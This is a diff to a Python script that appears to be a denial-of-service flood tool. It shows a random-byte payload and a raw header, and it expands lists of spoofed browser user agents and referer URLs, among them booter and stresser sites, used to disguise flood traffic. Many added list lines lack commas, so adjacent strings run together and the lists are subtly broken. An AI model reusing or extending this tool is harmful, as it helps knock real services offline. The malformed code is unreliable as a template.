@@ -32,7 +32,7 @@ print('''
 	''') # la grafica ci sta
                                                                        
 HEADER = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
-
+       
 bytes=random._urandom(5024)
                        
 userag =["Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"]
@@ -62,31 +62,40 @@ referers = [
 	"https://check-host.net/",
 	"https://www.facebook.com/",
  	"https://www.youtube.com/",
-        "https://www.rambler.ru/",
         "https://cyber-hub.pw/"
-        "https://www.vedbex.com/tools/home" ,
-        "https://www.ibm.com/cloud",
-        "https://voxility.com/",
-        "https://duckduckgo.com/",
+        "https://www.vedbex.com/tools/home" 
+        "https://www.ibm.com/cloud"
+        "https://voxility.com/"
         "https://www.redwolfsecurity.com/"
-        "https://www.ionos.com/",
+        "https://www.ionos.com/"
+        "https://duckduckgo.com/"
+        "http://ffm.cloudlayar.xyz/HIT",
+        "https://1gb.ru/",
+        "https://artplanet.ru/",
+        "https://api.freeboot.to/",
         "https://www.react.su/"
+        "https://synstresser.to/"
+        "https://freeboot.to/"
+        "https://dosninja.com/"
         "http://ddos-protection.ru/"
 	"https://www.fbi.com/",
 	"https://www.bing.com/search?q=",
-        "https://www.cloudflare.com/"
-        "https://www.ovh.ie/"
-        "https://www.hetzner.com/"
-        "https://ddos-guard.net/"
+        "https://www.cloudflare.com/",
+        "https://www.ovh.ie/",       
+        "https://www.hetzner.com/",
+        "https://ddos-guard.net/",  
         "https://blazingfast.io/",
+        "https://www.rambler.ru/",
         "https://selectel.ru/"
         "https://www.cloudns.net/"
+        "http://1.1.1.1/"
         "http://regex.info/exif.cgi?url="
-        "https://upcloud.com/",
+        "https://upcloud.com/"
+        "https://www.nhc.noaa.gov/"
         "https://www.youtube.com/"
-        "https://www.online.net/",
+        "https://www.online.net/"
         "https://www.linode.com/"
-        "https://www.datacamp.com/",
+        "https://www.datacamp.com/"
         "https://yandex.ru/"
         "https://beget.com/"
         "https://add.my.yahoo.com/rss?url"
@@ -112,7 +121,7 @@ referers = [
         "https://cloudnode.pw/"
 	"https://r.search.yahoo.com/",
 ]
-                                                                                                                             
+                                                                                                                          
 useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
 			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
@@ -202,15 +211,35 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
 			"Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]",
 			"Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)",
 			"Mozilla/4.8 [en] (Windows NT 5.1; U)",
-			"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)",
+ 			"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
+                       "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
+              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
+              "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
+              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
+              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
+              "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
+              "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
+              "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
+              "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
+              "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+              "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
+              "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
+              "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
+              "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
+              "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
-			"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
+ 			"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
 			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1",
 			"Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
 			"Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot) ",
 			"Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
-			"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;",
+                        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19"
+"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10"
+"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7"
+ 			"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;",
 			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)",
 			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)",
 			"Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)",
